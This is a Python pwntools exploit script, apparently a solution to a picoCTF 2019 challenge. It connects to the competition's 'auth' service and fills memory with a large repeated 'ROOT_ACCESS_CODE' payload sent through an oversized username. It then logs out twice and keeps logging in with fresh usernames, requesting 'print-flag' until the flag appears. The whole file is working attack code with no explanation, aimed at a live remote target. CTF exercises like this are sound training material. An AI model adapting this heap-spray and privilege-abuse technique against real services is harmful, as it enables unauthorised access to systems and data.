#coding=utf-8
from pwn import *
import binascii

main_fgets = 0x400d3d
login = 0x400cef
login_fgets = 0x400bd2
login_username = 0x6036a0
u = 0x603670
anon_user = 0x6020e0
strcmp = 0x400a1d

payload = (p64(0x45444f435f535345) + p64(0x4343415f544f4f52)) * 5000

#p = process('./auth')
p = remote('2019shell1.picoctf.com', 37919)
p.recvuntil('Enter your command:')
p.sendline('login')
p.recvuntil('Please enter the length of your username')
p.sendline('100000')
p.recvuntil('Please enter your username')
#raw_input(str(proc.pidof(p)))
p.sendline(payload)
p.recvuntil('Enter your command:')
p.sendline('logout')
p.recvuntil('Enter your command:')
p.sendline('logout')
p.recvuntil('Enter your command:')


count = 0 
while 1:
    try:
        count += 1
        p.sendline('login')
        res = p.recvuntil('Please enter the length of your username')
        p.sendline('20')
        res += p.recvuntil('Please enter your username')
        p.sendline('zeze{}'.format(count))
        res += p.recvuntil('Enter your command:')
        p.sendline('print-flag') 
        res += p.recvuntil('Enter your command:')
        if 'pico' in res:
            print res
            break
        #print count
    except:
        print res
        break
